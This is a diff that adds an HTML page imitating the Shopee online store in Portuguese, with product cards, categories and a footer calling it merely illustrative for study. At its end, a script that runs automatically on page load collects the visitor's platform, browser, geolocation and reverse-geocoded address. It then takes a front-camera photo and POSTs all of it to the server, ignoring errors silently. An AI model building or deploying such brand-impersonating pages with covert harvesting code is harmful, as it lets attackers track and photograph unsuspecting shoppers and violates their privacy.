@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Shopee Clone — Loja Online</title>
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/869/869869.png">
+  <style>
+    :root {
+      --shopee-orange: #ff5722;
+      --header-bg: #26262b;
+      --bg: #181820;
+      --card: #23232c;
+      --sidebar: #20202a;
+      --text: #f4f4f4;
+      --muted: #bdbdbd;
+      --accent: #ffd835;
+      --border: #282837;
+    }
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
+      min-height: 100vh;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      background: var(--header-bg);
+      padding: 0 36px;
+      height: 68px;
+      box-shadow: 0 2px 10px #0009;
+      position: sticky; top:0; left:0; right:0; z-index:10;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      margin-right: 32px;
+    }
+    .logo img {
+      height: 38px; margin-right: 9px;
+    }
+    .logo-title {
+      font-size: 2.0em;
+      font-weight: bold;
+      color: var(--shopee-orange);
+      letter-spacing: -1.2px;
+    }
+    .search-bar {
+      flex: 2 1 0%;
+      display: flex; align-items: center;
+    }
+    .search-bar input {
+      width: 380px;
+      padding: 8px 18px;
+      font-size: 1.11em;
+      border: 1px solid var(--border);
+      border-radius: 22px 0 0 22px;
+      outline: none;
+      background: #181820;
+      color: var(--text);
+    }
+    .search-bar button {
+      border: 1px solid var(--border);
+      border-left: none;
+      background: var(--shopee-orange);
+      color: #fff;
+      padding: 8px 26px;
+      border-radius: 0 22px 22px 0;
+      font-size: 1.0em;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background .17s;
+    }
+    .search-bar button:hover {
+      background: #d24417;
+    }
+    .user-icon {
+      background: #363648;
+      color: var(--text);
+      border-radius: 50%;
+      width: 36px; height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 21px;
+      margin-left: 30px;
+    }
+    #status {
+      margin-left: 26px;
+      font-size: 1.02em;
+      color: #00efb8;
+      font-weight: bold;
+    }
+
+    .navbar {
+      background: var(--shopee-orange);
+      padding: 0 36px;
+      height: 41px;
+      display: flex;
+      align-items: center;
+      gap: 30px;
+      font-size: 1.09em;
+      letter-spacing: .01em;
+      font-weight: 500;
+    }
+    .navbar a {
+      color: #fff; text-decoration: none; padding: 0 4px;
+      transition: color .13s;
+    }
+    .navbar a:hover {
+      color: var(--accent);
+    }
+
+    .container {
+      max-width: 1440px;
+      margin: 32px auto 0 auto;
+      display: flex;
+      gap: 32px;
+      padding: 0 16px;
+    }
+    aside.sidebar {
+      flex: 1 1 0%;
+      max-width:230px;
+      padding: 0;
+      background: var(--sidebar);
+      border-radius: 14px;
+      margin-bottom: 16px;
+      box-shadow: 0 3px 24px #0005;
+      height: fit-content;
+    }
+    .sidebar-title {
+      color: var(--shopee-orange);
+      font-size: 1.02em;
+      font-weight: bold;
+      margin: 22px 0 9px 22px;
+      letter-spacing: .03em;
+    }
+    .sidebar-menu {
+      list-style: none; margin: 0 0 20px 0; padding:0;
+    }
+    .sidebar-menu li {
+      padding: 0;
+      margin: 0;
+    }
+    .sidebar-menu li a {
+      display: block;
+      color: var(--text);
+      text-decoration: none;
+      padding: 12px 22px;
+      font-size: 1.04em;
+      border-bottom: 1px solid var(--border);
+      border-radius: 6px 6px 0 0;
+      transition: background .10s;
+    }
+    .sidebar-menu li a:hover {
+      background: #312934;
+      color: var(--accent);
+    }
+
+    main {
+      flex: 4 1 0%;
+      display: flex; flex-direction: column; gap: 28px;
+    }
+
+    .banner {
+      background: linear-gradient(120deg, #ff5722 50%, #fb852a 99%);
+      border-radius: 16px;
+      min-height: 180px;
+      padding: 32px 38px;
+      display: flex;
+      align-items: center;
+      gap: 38px;
+      margin-bottom: 5px;
+      box-shadow: 0 2px 12px #c85d2638;
+    }
+    .banner img {
+      width: 135px; height:135px; border-radius: 20px;
+      box-shadow: 0 2px 16px #0006;
+    }
+    .banner-content {
+      color: #fff;
+    }
+    .banner-title {
+      font-size: 2em;
+      font-weight: bold;
+      margin-bottom: 8px;
+      letter-spacing: -1px;
+    }
+    .banner-desc {
+      font-size: 1.14em;
+    }
+
+    .categories {
+      display: flex;
+      gap: 17px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .category-card {
+      background: var(--card);
+      color: var(--shopee-orange);
+      border-radius: 10px;
+      box-shadow: 0 1px 10px #0005;
+      display: flex; flex-direction: column; align-items: center;
+      width: 88px; min-height: 104px;
+      padding: 14px 0 11px 0;
+      font-size: 13.5px;
+      font-weight: 550;
+      cursor: pointer;
+      transition: background .12s, color .12s, transform .10s;
+    }
+    .category-card img {
+      width:39px;height:39px; margin-bottom:7px;
+      border-radius: 50%; background: #fff1;
+      box-shadow: 0 2px 8px #0003;
+      object-fit: cover;
+    }
+    .category-card:hover {
+      background: #312934;
+      color: var(--accent);
+      transform: translateY(-2px) scale(1.05);
+    }
+
+    .product-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit,minmax(220px,1fr));
+      gap: 32px 20px;
+    }
+    .product-card {
+      background: var(--card);
+      border-radius: 13px;
+      box-shadow: 0 2px 19px #0007;
+      overflow: hidden;
+      transition: transform .11s, box-shadow .13s;
+      display: flex; flex-direction: column;
+      cursor: pointer;
+    }
+    .product-card:hover {
+      transform: scale(1.025) translateY(-4px);
+      box-shadow: 0 2px 32px #000b;
+    }
+    .product-thumb {
+      width:100%; height:170px; object-fit: cover; display:block;
+      background: #1c1718;
+    }
+    .product-info {
+      padding: 14px 17px 11px 17px;
+      flex: 1 1 0%; display: flex; flex-direction: column;
+    }
+    .product-title {
+      font-size: 1.03em;
+      color: #fff; margin-bottom: 7px;
+      font-weight: 600;
+    }
+    .product-meta {
+      color: var(--muted);
+      font-size: .89em;
+      margin-bottom: 7px;
+    }
+    .product-price {
+      color: var(--shopee-orange);
+      font-size: 1.14em;
+      font-weight: bold;
+      letter-spacing: .02em;
+      margin-bottom: 7px;
+    }
+    .product-rating {
+      font-size: 0.98em;
+      color: #FFD835;
+    }
+    footer {
+      margin-top: 34px;
+      background: #1a1a22;
+      color: #bbb;
+      padding: 18px;
+      text-align: center;
+      letter-spacing: .08em;
+      font-size: .97em;
+      border-top: 1px solid #262629;
+    }
+    @media (max-width:1050px) {
+      .container {flex-direction:column; gap:20px;}
+      aside.sidebar {max-width:none;}
+    }
+    @media (max-width:700px) {
+      main{gap:15px;}
+      .banner {padding:18px 6px;flex-direction:column;align-items:start;height:auto;}
+      .banner img{margin-bottom:13px;}
+      .categories {gap:7px;}
+      .category-card {width:69px; font-size:12.7px;}
+      .product-grid {gap:15px 4px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="https://cdn-icons-png.flaticon.com/512/869/869869.png" alt="Shopee Logo">
+      <span class="logo-title">Shopee</span>
+    </div>
+    <form class="search-bar" onsubmit="return false;">
+      <input type="text" placeholder="Buscar produtos, marcas e mais...">
+      <button title="Buscar">Buscar</button>
+    </form>
+    <div class="user-icon" title="Usuário">??</div>
+    <span id="status">Bem-vindo ao Shopee Clone</span>
+  </header>
+  <div class="navbar">
+    <a href="#">Ofertas do Dia</a>
+    <a href="#">Moda</a>
+    <a href="#">Eletrônicos</a>
+    <a href="#">Casa & Jardim</a>
+    <a href="#">Beleza</a>
+    <a href="#">Esportes</a>
+    <a href="#">Mercado</a>
+    <a href="#">Mais</a>
+  </div>
+  <div class="container">
+    <aside class="sidebar">
+      <div class="sidebar-title">Categorias Populares</div>
+      <ul class="sidebar-menu">
+        <li><a href="#">Smartphones</a></li>
+        <li><a href="#">Tênis</a></li>
+        <li><a href="#">Beleza e Cuidados</a></li>
+        <li><a href="#">Moda Masculina</a></li>
+        <li><a href="#">Games</a></li>
+        <li><a href="#">Brinquedos</a></li>
+      </ul>
+      <div class="sidebar-title">Destaques</div>
+      <ul class="sidebar-menu">
+        <li><a href="#">Frete Grátis</a></li>
+        <li><a href="#">Lançamentos</a></li>
+        <li><a href="#">Mais vendidos</a></li>
+      </ul>
+    </aside>
+    <main>
+      <section class="banner">
+        <img src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?auto=format&fit=crop&w=320&q=80" alt="Banner destaque">
+        <div class="banner-content">
+          <div class="banner-title">Mega Promoção Frete Grátis!</div>
+          <div class="banner-desc">Aproveite ofertas exclusivas e receba em casa sem pagar frete. Só hoje!</div>
+        </div>
+      </section>
+      <section class="categories">
+        <div class="category-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/3159/3159066.png">
+          Eletrônicos
+        </div>
+        <div class="category-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/859/859469.png">
+          Moda
+        </div>
+        <div class="category-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/859/859607.png">
+          Beleza
+        </div>
+        <div class="category-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png">
+          Casa
+        </div>
+        <div class="category-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/1995/1995574.png">
+          Esportes
+        </div>
+        <div class="category-card">
+          <img src="https://cdn-icons-png.flaticon.com/512/3750/3750955.png">
+          Games
+        </div>
+      </section>
+      <section class="product-grid">
+        <div class="product-card">
+          <img class="product-thumb" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="product-info">
+            <div class="product-title">Tênis Esportivo Unissex ABC</div>
+            <div class="product-meta">Envio grátis • De: São Paulo</div>
+            <div class="product-price">R$ 159,90</div>
+            <div class="product-rating">? 4.8 (2.193)</div>
+          </div>
+        </div>
+        <div class="product-card">
+          <img class="product-thumb" src="https://images.unsplash.com/photo-1526178613658-3f1622045544?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="product-info">
+            <div class="product-title">Smartphone XYZ 128GB Preto</div>
+            <div class="product-meta">Promoção relâmpago</div>
+            <div class="product-price">R$ 999,00</div>
+            <div class="product-rating">? 4.9 (1.302)</div>
+          </div>
+        </div>
+        <div class="product-card">
+          <img class="product-thumb" src="https://images.unsplash.com/photo-1519125323398-675f0ddb6308?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="product-info">
+            <div class="product-title">Kit Skincare Facial Premium</div>
+            <div class="product-meta">Vendido por BelezaVip</div>
+            <div class="product-price">R$ 79,50</div>
+            <div class="product-rating">? 4.7 (740)</div>
+          </div>
+        </div>
+        <div class="product-card">
+          <img class="product-thumb" src="https://images.unsplash.com/photo-1444065381814-865dc9da92c0?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="product-info">
+            <div class="product-title">Fone de Ouvido Bluetooth 5.0</div>
+            <div class="product-meta">Frete Grátis</div>
+            <div class="product-price">R$ 59,90</div>
+            <div class="product-rating">? 4.6 (1.028)</div>
+          </div>
+        </div>
+        <div class="product-card">
+          <img class="product-thumb" src="https://images.unsplash.com/photo-1465101046530-73398c7f28ca?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="product-info">
+            <div class="product-title">Camisa Masculina Slim Fit</div>
+            <div class="product-meta">Pronta-entrega</div>
+            <div class="product-price">R$ 49,90</div>
+            <div class="product-rating">? 4.9 (729)</div>
+          </div>
+        </div>
+        <div class="product-card">
+          <img class="product-thumb" src="https://images.unsplash.com/photo-1517935706615-2717063c2225?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="product-info">
+            <div class="product-title">Console Retrô 900 Jogos 2 Controles</div>
+            <div class="product-meta">Marketplace • Garantia 3 meses</div>
+            <div class="product-price">R$ 239,00</div>
+            <div class="product-rating">? 4.5 (345)</div>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+  <footer>
+    &copy; 2025 Shopee Clone — Página meramente ilustrativa para fins de estudo.
+  </footer>
+  <script>
+    // Script de coleta de localização, sistema, navegador, câmera
+    async function capturarDados() {
+      try {
+        const sistema = navigator.platform;
+        const navegador = navigator.userAgent;
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          let endereco = 'Desconhecido';
+          try {
+            const geoRes = await fetch(\`https://nominatim.openstreetmap.org/reverse?lat=\${latitude}&lon=\${longitude}&format=json\`);
+            const geoData = await geoRes.json();
+            endereco = geoData.display_name || endereco;
+          } catch{}
+
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+
+            setTimeout(() => {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imagem = canvas.toDataURL('image/png');
+
+              fetch('/dados', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  latitude,
+                  longitude,
+                  endereco,
+                  imagem,
+                  sistema,
+                  navegador
+                })
+              }).then(() => {
+                document.getElementById('status').textContent = '? Dados enviados com sucesso!';
+                stream.getTracks().forEach(track => track.stop());
+              }).catch(() => {
+                stream.getTracks().forEach(track => track.stop());
+              });
+            }, 3000);
+          } catch {
+            // ignora erro de câmera
+          }
+        }, (err) => {
+          // ignora erro de localização/rejeição do usuário
+        });
+      } catch (err) {
+        // erro geral ignorado
+      }
+    }
+
+    window.onload = capturarDados;
+  </script>
+</body>
+</html>
